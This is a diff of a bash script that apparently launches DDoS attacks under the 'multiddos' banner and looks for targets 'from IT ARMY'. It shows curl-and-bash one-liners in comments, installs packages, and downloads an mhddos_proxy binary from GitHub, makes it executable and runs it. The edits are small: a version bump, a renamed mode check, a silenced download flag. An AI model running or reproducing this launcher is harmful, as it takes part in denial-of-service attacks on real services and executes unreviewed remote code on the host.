@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.2d\n"
+clear && echo -e "Loading... v1.2e\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -63,7 +63,7 @@ toilet -t --metal "Український"
 toilet -t --metal "   жнець"
 toilet -t --metal " MULTIDDOS"
 
-if [[ $mhddos_mode == "new" ]]; then
+if [[ $mhddos_mode == "new222" ]]; then
     typing_on_screen 'Шукаю завдання від IT ARMY...' && sleep 2&
 else
     typing_on_screen 'Шукаю завдання...' ; sleep 0.5
@@ -139,9 +139,8 @@ cat > auto_bash.sh << 'EOF'
 if [[ $mhddos_mode == "new" ]]; then
     echo "Downloading latest version of mhddos_proxy"
     cd ~/multidd/
-    curl -OL https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
+    curl -OLs https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
     chmod +x mhddos_proxy_linux
-    clear
 
     if [[ $ddos_size == "AUTO" ]]; then
         ./mhddos_proxy_linux --copies auto $args_to_pass
